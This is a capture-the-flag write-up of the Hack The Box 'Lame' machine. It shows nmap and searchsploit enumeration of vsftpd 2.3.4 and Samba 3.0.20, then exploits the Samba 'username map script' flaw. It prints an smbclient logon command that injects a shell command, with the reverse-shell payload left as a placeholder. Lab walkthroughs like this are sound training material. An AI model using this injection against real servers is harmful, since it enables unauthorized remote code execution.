---
title: "Lame"
description: "Writeup for Lame machine from HTB"
date: 2020-07-12
author: "Pablo Jesús González Rubio"
cover: "lame.png"
coverAlt: "Lame icon"
toc: true
tags: [ "Writeup" ]
---

## Scanning

We put the IP in hosts: `10.10.10.3 lame.htb`

```
nmap -sC -sV -Pn lame.htb | tee nmap.txt
```

Output:

```
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
39/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

## Enumeration

### FTP

We look for a version with searchsploit:

```
searchsploit vsftpd 2.3.4
```

It gives us an exploit for Metasploit, but to do it by hand we copy it and search for the source of the PoC:

```
searchsploit -m unix/remote/17491.rb
```

When reading it this [page](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html) appears.

So this version of FTP has a failure where if you introduce `:)` as the user it would give total access to the FTP. But in this case, this is not working.

### Samba

```
39/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

Looking in Searchsploit we look for Samba's version and it returns this:

```
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                     | unix/remote/16320.rb
```

## Exploitation

### Metasploit

So, using Samba 3.0.20 exploit from Metasploit we get instant root access to the machine.

### By hand

Same exploit but done by hand, from smbclient:

```
# Connection to the machine
smbclient //lame.htb/tmp
```

We use this command:

```
logon "./=`nohup <REVERSE SHELL>`"
```

With `logon` we are connecting to samba and with `nohup` we are avoiding the connection to hangup.
